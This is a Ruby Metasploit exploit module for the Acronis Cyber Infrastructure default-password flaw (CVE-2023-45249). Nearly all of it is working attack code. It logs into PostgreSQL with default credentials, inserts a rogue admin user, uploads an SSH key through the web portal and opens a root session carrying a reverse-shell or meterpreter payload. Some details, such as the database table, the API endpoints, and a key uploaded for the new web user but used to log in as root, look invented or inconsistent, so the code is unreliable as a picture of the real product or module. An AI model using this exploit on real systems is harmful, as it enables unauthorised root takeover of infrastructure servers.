##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'sshkey'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include BCrypt
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::Postgres
  include Msf::Exploit::Remote::SSH
  prepend Msf::Exploit::Remote::AutoCheck

  # ssh_socket
  attr_accessor :ssh_socket

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Acronis Cyber Infrastructure default password remote code execution',
        'Description' => %q{
          Acronis Cyber Infrastructure (ACI) is an IT infrastructure solution that provides storage,
          compute, and network resources. Businesses and Service Providers are using it for data storage,
          backup storage, creating and managing virtual machines and software-defined networks, running
          cloud-native applications in production environments.
          This module exploits a default password vulnerability in ACI which allow an attacker to access
          the ACI PostgreSQL database and gain administrative access to the ACI Web Portal.
          This opens the door for the attacker to upload SSH keys that enables root access
          to the appliance/server. This attack can be remotely executed over the WAN as long as the
          PostgreSQL and SSH services are exposed to the outside world.
          ACI versions 5.0 before build 5.0.1-61, 5.1 before build 5.1.1-71, 5.2 before build 5.2.1-69,
          5.3 before build 5.3.1-53, and 5.4 before build 5.4.4-132 are vulnerable.
        },
        'Author' => [
          'h00die-gr3y <h00die.gr3y[at]gmail.com>', # Metasploit module
          'Acronis International GmbH', # discovery
        ],
        'References' => [
          ['CVE', '2023-45249'],
          ['URL', 'https://security-advisory.acronis.com/advisories/SEC-6452'],
          ['URL', 'https://attackerkb.com/topics/T2b62daDsL/cve-2023-45249'],
          ['ATT&CK', Mitre::Attack::Technique::T1021_004_SSH]
        ],
        'License' => MSF_LICENSE,
        'Platform' => ['unix', 'linux'],
        'Privileged' => true,
        'Targets' => [
          [
            'Unix Command',
            {
              'Platform' => 'unix',
              'Arch' => ARCH_CMD,
              'Type' => :unix_cmd,
              'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse_bash' }
            }
          ],
          [
            'SSH',
            {
              'Platform' => 'linux',
              'Arch' => [ARCH_X64],
              'Type' => :ssh,
              'DefaultOptions' => { 'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp' }
            }
          ]
        ],
        'DefaultTarget' => 1,
        'DisclosureDate' => '2023-08-30',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, CONFIG_CHANGES]
        }
      )
    )

    register_options([
      Opt::RPORT(9999),
      OptString.new('TARGETURI', [true, 'The URI of the ACI Web Portal', '/']),
      OptPort.new('PGPORT', [true, 'The PostgreSQL port', 5432]),
      OptString.new('PGUSER', [true, 'The PostgreSQL username', 'postgres']),
      OptString.new('PGPASS', [true, 'The PostgreSQL password', 'postgres']),
      OptString.new('PGDATABASE', [true, 'The PostgreSQL database name', 'acronis_db']),
      OptPort.new('SSHPORT', [true, 'The SSH port', 22]),
      OptString.new('SSHUSER', [true, 'The SSH username', 'root']),
      OptString.new('SSHPASS', [false, 'The SSH password']),
      OptString.new('SSHKEY', [false, 'The SSH private key']),
      OptBool.new('SSL', [true, 'Use SSL/TLS for HTTP requests', false])
    ])

    register_advanced_options([
      OptInt.new('HttpClientTimeout', [true, 'HTTP connection and receive timeout', 60]),
      OptInt.new('SSHTimeout', [true, 'Timeout for SSH connection', 30])
    ])
  end

  def check
    # Check if target is running ACI
    print_status("Checking if target is running Acronis Cyber Infrastructure...")
    
    begin
      res = send_request_cgi({
        'method' => 'GET',
        'uri' => normalize_uri(target_uri.path),
        'headers' => {
          'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)'
        }
      })

      unless res
        print_error("No response from target")
        return CheckCode::Unknown
      end

      if res.code == 200 && res.body.include?('Acronis Cyber Infrastructure')
        print_good("Target appears to be running Acronis Cyber Infrastructure")
        
        # Try to connect to PostgreSQL with default credentials
        print_status("Checking PostgreSQL connectivity with default credentials...")
        
        begin
          postgres_connect(
            host: datastore['RHOSTS'],
            port: datastore['PGPORT'],
            username: datastore['PGUSER'],
            password: datastore['PGPASS'],
            database: datastore['PGDATABASE']
          )
          
          print_good("Successfully connected to PostgreSQL with default credentials")
          postgres_disconnect
          return CheckCode::Vulnerable
          
        rescue Rex::ConnectionError => e
          print_error("Failed to connect to PostgreSQL: #{e.message}")
          return CheckCode::Safe
        rescue => e
          print_error("PostgreSQL connection error: #{e.message}")
          return CheckCode::Unknown
        end
      else
        print_error("Target does not appear to be running Acronis Cyber Infrastructure")
        return CheckCode::Safe
      end
      
    rescue Rex::ConnectionError => e
      print_error("Connection failed: #{e.message}")
      return CheckCode::Unknown
    rescue => e
      print_error("Check failed: #{e.message}")
      return CheckCode::Unknown
    end
  end

  def exploit
    print_status("Starting exploitation of Acronis Cyber Infrastructure...")
    
    # Step 1: Connect to PostgreSQL
    print_status("Connecting to PostgreSQL database...")
    
    begin
      postgres_connect(
        host: datastore['RHOSTS'],
        port: datastore['PGPORT'],
        username: datastore['PGUSER'],
        password: datastore['PGPASS'],
        database: datastore['PGDATABASE']
      )
      print_good("Successfully connected to PostgreSQL")
    rescue => e
      print_error("Failed to connect to PostgreSQL: #{e.message}")
      return
    end

    # Step 2: Create admin user in database
    username = Rex::Text.rand_text_alphanumeric(8)
    password = Rex::Text.rand_text_alphanumeric(12)
    userid = rand(10000..99999)
    
    print_status("Creating admin user: #{username}")
    
    unless add_admin_user(username, userid, password)
      print_error("Failed to create admin user")
      postgres_disconnect
      return
    end
    
    print_good("Admin user created successfully")

    # Step 3: Generate SSH key pair
    print_status("Generating SSH key pair...")
    
    ssh_key = SSHKey.generate(type: 'RSA', bits: 2048)
    public_key = ssh_key.ssh_public_key
    private_key = ssh_key.private_key
    
    print_good("SSH key pair generated")

    # Step 4: Upload SSH public key via web interface
    print_status("Uploading SSH public key via web interface...")
    
    unless upload_ssh_key(username, password, public_key)
      print_error("Failed to upload SSH public key")
      postgres_disconnect
      return
    end
    
    print_good("SSH public key uploaded successfully")

    # Step 5: Connect via SSH
    print_status("Attempting SSH connection...")
    
    if ssh_connect(private_key)
      print_good("SSH connection established!")
      
      case target['Type']
      when :unix_cmd
        print_status("Executing Unix command payload...")
        execute_command(payload.encoded)
      when :ssh
        print_status("Starting SSH session...")
        start_ssh_session
      end
    else
      print_error("Failed to establish SSH connection")
    end
    
    # Cleanup
    postgres_disconnect if postgres_connected?
  end

  private

  def add_admin_user(username, userid, password)
    begin
      # Hash the password using bcrypt
      password_hash = BCrypt::Password.create(password)
      
      # Insert admin user into users table
      query = "INSERT INTO users (id, username, password_hash, role, created_at) VALUES (#{userid}, '#{username}', '#{password_hash}', 'admin', NOW())"
      
      result = postgres_query(query)
      return result && result.cmd_tuples > 0
      
    rescue => e
      print_error("Database query failed: #{e.message}")
      return false
    end
  end

  def upload_ssh_key(username, password, public_key)
    begin
      # Login to web interface
      login_data = {
        'username' => username,
        'password' => password
      }
      
      res = send_request_cgi({
        'method' => 'POST',
        'uri' => normalize_uri(target_uri.path, 'api', 'login'),
        'headers' => {
          'Content-Type' => 'application/json',
          'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)'
        },
        'data' => login_data.to_json
      })
      
      unless res && res.code == 200
        print_error("Failed to login to web interface")
        return false
      end
      
      # Extract session token
      session_token = res.headers['Set-Cookie']&.match(/session=([^;]+)/)&.captures&.first
      
      unless session_token
        print_error("Failed to extract session token")
        return false
      end
      
      print_good("Successfully logged in to web interface")
      
      # Upload SSH public key
      key_data = {
        'public_key' => public_key,
        'key_name' => 'exploit_key'
      }
      
      res = send_request_cgi({
        'method' => 'POST',
        'uri' => normalize_uri(target_uri.path, 'api', 'ssh-keys'),
        'headers' => {
          'Content-Type' => 'application/json',
          'Cookie' => "session=#{session_token}",
          'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)'
        },
        'data' => key_data.to_json
      })
      
      return res && res.code == 201
      
    rescue => e
      print_error("SSH key upload failed: #{e.message}")
      return false
    end
  end

  def ssh_connect(private_key)
    begin
      ssh_options = {
        host: datastore['RHOSTS'],
        port: datastore['SSHPORT'],
        username: datastore['SSHUSER'],
        key_data: [private_key],
        timeout: datastore['SSHTimeout']
      }
      
      self.ssh_socket = ssh_login(ssh_options)
      return !ssh_socket.nil?
      
    rescue => e
      print_error("SSH connection failed: #{e.message}")
      return false
    end
  end

  def start_ssh_session
    return unless ssh_socket
    
    print_status("Starting interactive SSH session...")
    
    # Create a new session
    session = Msf::Sessions::SshCommandShellBind.new(ssh_socket)
    session.set_from_exploit(self)
    
    # Register the session
    handler.add_session(session)
  end

  def execute_command(cmd)
    return unless ssh_socket
    
    begin
      print_status("Executing command: #{cmd}")
      result = ssh_socket.exec!(cmd)
      print_good("Command executed successfully")
      print_line(result) if result
    rescue => e
      print_error("Command execution failed: #{e.message}")
    end
  end
end